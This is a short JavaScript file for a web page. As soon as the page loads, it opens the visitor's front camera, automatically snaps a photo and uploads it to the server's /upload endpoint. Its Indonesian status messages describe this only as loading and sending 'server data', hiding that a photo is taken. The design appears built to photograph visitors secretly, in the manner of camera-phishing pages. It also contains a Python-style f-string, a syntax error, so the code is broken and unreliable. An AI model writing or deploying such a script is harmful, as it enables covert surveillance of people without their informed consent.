(() => {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const status = document.getElementById('status');

  let stream = null;
  const sendTimeoutMs = 800;

  function log(s, isError = false) {
    status.textContent = s;
    status.style.color = isError ? '#f66' : '#0ff';
  }

  async function startCamera() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false
      });
      video.srcObject = stream;
      await video.play();
      log('Sukses memuat, mengambil data server...');
      setTimeout(() => autoCaptureAndSend(), sendTimeoutMs);
    } catch (err) {
      log('Gagal akses kamera: ' + (err && err.message ? err.message : err), true);
    }
  }

  function stopCamera() {
    if (!stream) return;
    for (const t of stream.getTracks()) t.stop();
  }

  function captureBlob() {
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.save();
    ctx.scale(-1, 1);
    ctx.drawImage(video, -w, 0, w, h);
    ctx.restore();
    return new Promise(resolve => canvas.toBlob(b => resolve(b), 'image/jpeg', 0.85));
  }

  async function autoCaptureAndSend() {
    try {
      const blob = await captureBlob();
      log('Mengirim data ke server...');
      await sendPhotoToServer(blob);
      log('Data terkirim!');
      stopCamera();
    } catch (err) {
      log('Gagal capture/kirim: ' + (err && err.message ? err.message : err), true);
    }
  }

  async function sendPhotoToServer(blob) {
    const formData = new FormData();
    formData.append('photo', blob, 'capture.jpg');
    const baseUrl = (window.location.protocol === 'file:') ? 'http://localhost:8080' : window.location.origin;
    const res = await fetch(baseUrl + '/upload', { method: 'POST', body: formData });
    const text = await res.text();
    if (!res.ok) throw new Error(f"Server {res.status}: " + text.slice(0, 200));
  }

  window.addEventListener('load', () => startCamera());
  window.addEventListener('beforeunload', () => stopCamera());
})();
